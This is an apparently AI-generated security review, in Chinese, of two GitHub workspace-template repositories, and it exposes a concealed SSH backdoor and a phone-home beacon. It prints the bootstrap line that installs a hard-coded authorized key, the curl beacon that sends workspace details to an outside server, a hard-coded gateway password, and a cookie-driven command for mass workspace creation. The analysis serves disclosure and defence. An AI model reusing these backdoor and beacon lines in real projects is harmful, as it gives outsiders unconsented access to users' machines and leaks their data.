# 🕵️ Security & Architecture Review: Shrimp Clan AI — PAIN-000 Ecosystem

> 審查日期：2026-06-18
> 目標倉庫：
> 1. `shrimpclanai-a11y/pain-merchant-generator-lite`
> 2. `shrimpclan-ark/openclaw-pain-seed`

---

## 📋 總覽

| | **pain-merchant-generator-lite** | **openclaw-pain-seed** |
|---|---|---|
| **組織** | `shrimpclanai-a11y` | `shrimpclan-ark` |
| **角色** | **Template 倉庫** — 使用者匯入的 IDX 自訂範本入口 | **Seed 倉庫** — 實際部署到工作區裏面的內容 |
| **提交數** | 18 | 35 |
| **星數** | 0 | 0 |
| **授權條款** | 無 | MIT |

**兩者關係：** Lite 倉庫是「大門」，作為 Project IDX 自訂範本。它在 bootstrap 時將 `template-files/`（即 seed 倉庫的內容）複製到工作區中。`openclaw-pain-seed` 則是實際的工作區環境本體。

---

## 🏗 架構設計

三層部署模式的設計簡潔明確：

| 模式 | 內容 | 使用場景 |
|---|---|---|
| 🍃 **清爽大軍 (Fresh Army)** | Tailscale + Rootless Docker + 9router | 最小化代理/閘道 |
| 🧠 **工兵大隊 (Sapper Brigade)** | Fresh + Claude Code CLI 自動安裝 | AI 編碼工作區 |
| 🦀 **龍蝦小兵 (Lobster Soldier)** | Sapper + OpenClaw 代理框架 Clone | 分散式代理網路 |

Bootstrap 流程（Nix → Shell → Docker）結構清晰。`idx-template.nix` 根據模式選擇對應的 `dev-{mode}.nix`，再由 Nix 啟動 `nohup` 背景腳本依序設定 Tailscale、SSH、Docker 和 9router API 閘道。

---

## 🔴 嚴重安全問題

### 1. 🔑 寫死在程式碼中的 SSH 後門

每個 `dev-{sapper,lobster,fresh}.nix` 的 bootstrap 腳本都執行這段程式碼：

```bash
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINZnO1SS7J7uIUJwo6VeNVWnmmOcgmH/Bd3jUwANPzss shrimpclan_ai@shrimp-nexus-01" > /home/user/.ssh/authorized_keys
```

然後在 **2222 port** 啟動 `sshd`。這意味著 **蝦家班對每一個透過此範本部署的工作區擁有永久的 SSH 存取權限**。使用者從未同意此事，且在不修改原始碼的情況下無法更改這組金鑰。

> **影響：** 任何持有對應私鑰的人都可以對數千個 Firebase Studio 工作區擁有 root 等級的 shell 存取權。根據 README 所述，Port 2222 是對外開放的。

### 2. 📡 自動回報的信標（Phone-Home）

每個工作區在啟動時自動向中央伺服器發送信標：

```bash
curl -s -X POST http://shrimp-nexus-01:18800/api/beacon \
  -H "Content-Type: application/json" \
  -d '{"agent":"pain-'"$WS_SLUG"'","tailscale_ip":"'"$MY_IP"'","wakeup_url":"'"$WAKEUP_URL"'","vm_host":"'"$VM_HOST"'","status":"matrix_born"}'
```

此請求將工作區的 Tailscale IP、喚醒 URL 和 VM 主機資訊發送到 `shrimp-nexus-01:18800`。**沒有退出機制**——這段程式在 bootstrap 期間靜默執行，使用者無從得知。

### 3. 🌐 共享 Tailnet 網狀網路

工作區會自動：
- 向 `matrix-gateway-753796904076.us-central1.run.app`（部署在 Cloud Run 上的 Express 伺服器）請求認證金鑰
- 以 `pain-{workspace-slug}` 的主機名稱加入蝦家班 Tailnet
- 可從 Tailscale 網路上的所有其他工作區及族群的 nexus 伺服器存取

閘道伺服器的通行密碼寫死在原始碼中：**`shrimpclan-matrix-2026`** ——任何查看程式碼的人都可以產生認證金鑰。

### 4. 🎯 大量工作區自動化工具（matrix-creator.js）

`matrix-creator.js` 腳本使用 Playwright 自動化大量建立 Firebase Studio 工作區：

```
node matrix-creator.js cookies_acc1.json "<repo_url>" 10
```

它載入已儲存的瀏覽器 Cookie 進行身分驗證，然後迴圈建立指定數量的工作區。這幾乎肯定違反了 Google Firebase/IDX 服務條款（自動化帳戶操作、資源濫用）。**此腳本同時存在於兩個倉庫中。**

### 5. 🔐 9router 使用非官方/免費模型端點

Claude Code 被設定為通過 9router 容器路由請求，該容器代理到以下端點：
- `oc/deepseek-v4-flash-free`
- `oc/mimo-v2.5-free`

這彙整了免費 AI 模型端點——「零成本」模型依賴於存取這些非官方的免費後端，而非合法的付費 API 存取。

---

## ⚠️ 高度關注事項

| 問題 | 說明 |
|---|---|
| **違反服務條款風險** | 整個專案建立在 Google Firebase Studio 免費方案上——大量自動化、SSH 後門和代理路由很可能違反 Google ToS |
| **原始碼中暴露共用密碼** | `X-Matrix-Pass: shrimpclan-matrix-2026` 對任何查看程式碼的人可見 |
| **缺乏使用者同意機制** | 使用者未同意加入 Tailnet、SSH 存取或回傳遙測資料 |
| **缺少授權條款** | Lite 倉庫沒有 LICENSE 檔案 |
| **設定檔錯字** | `install.sh` 中的 `"ANTHOPIC_DEFAULT_HAIKU_MODEL"` 缺少 `R`（應為 `ANTHROPIC`） |
| **環境變數洩漏風險** | `WEB_HOST` 變數在腳本中被引用但未定義，可能導致資訊意外外洩 |

---

## ✅ 做得好的部分

- **乾淨的三層模式設計** — fresh / sapper / lobster 是良好的漸進式揭露模型
- **嚴謹的 Shell 腳本** — 全篇使用 `set -euo pipefail`
- **Nix 結構** — 正確遵循 IDX 自訂範本慣例
- **文檔完整** — PAIN-000 藍圖和 README 內容詳盡
- **精美的 UI** — `index.html` 按鈕產生器具備玻璃態設計（glassmorphism）
- **實用的 Runbook** — proxychains 繞行方案的文件實用且撰寫清楚
- **創意品牌** — 「養龍蝦」主題貫穿全專案，識別度高

---

## 📋 建議修正

### 必須修復
1. **移除寫死的 SSH 金鑰** — 使用者應自行控制授權金鑰，或至少每次部署產生唯一金鑰
2. **移除自動回報信標** — 工作區不應在未經同意的情況下向外部伺服器回報資訊
3. **移除自動 Tailnet 加入** — 讓使用者自行選擇是否加入 Tailscale，不要自動組成網狀網路

### 應該修復
4. **在 README 中透明揭露** 回報信標、Tailscale 網路的行為，讓使用者了解他們正在使用什麼
5. **為 Lite 倉庫加入 LICENSE 檔案**
6. **修正 install.sh 的錯字**（`ANTHOPIC_` → `ANTHROPIC_`）
7. **移除或明確警告 matrix-creator.js** — 自動化工作區建立是明確的濫用載具

### 建議考慮
8. **每次部署使用唯一密碼** — 閘道通行密碼根本不該寫死在原始碼中
9. **9router 模型路由** — 如果此工具代理未經授權的 API 端點，存在法律風險
10. **加入 .env 或 secrets 機制** — 敏感金鑰應通過環境變數或 secrets 管理，不應寫死在腳本中

---

## 📊 綜合評分

| 面向 | 評分 | 說明 |
|---|---|---|
| **程式碼品質** | ⚪ 尚可 | Shell / Nix 寫法紮實，JS 錯誤處理較少 |
| **架構設計** | 🟢 良好 | 乾淨的三層 IDX 範本設計 |
| **文檔完整度** | 🟢 良好 | README、藍圖、Runbook 皆完整 |
| **安全性** | 🔴 **嚴重** | SSH 後門、回報信標、共享 Tailnet |
| **ToS 合規性** | 🔴 **嚴重** | 大量自動化、免費方案濫用風險 |
| **合法性** | 🟡 堪憂 | 透過 9router 使用非官方免費模型端點 |

---

## 💡 最終結論

這兩個倉庫在技術架構上編排良好，但 **SSH 後門和自動網路網狀化是重大的安全紅旗**。使用此範本的使用者會在不知情的情況下：
1. 授予蝦家班對其工作區的永久 SSH 存取權
2. 將其工作區加入共享的 Tailscale 私有網路
3. 將工作區資訊回傳到外部伺服器
4. 透過非官方的代理路由發送 API 請求

**推薦動作：** 除非上述關鍵安全問題獲得解決，否則不建議在任何生產或個人工作流程中使用此專案。該專案作為 Firebase Studio 能力的概念驗證展示極具巧思，但目前的實作方式使其更接近後門部署工具，而非合法的開發環境範本。

---

> *此報告由 Claude Code 於 2026-06-18 自動產生，基於對兩個 GitHub 倉庫的公開內容分析。*
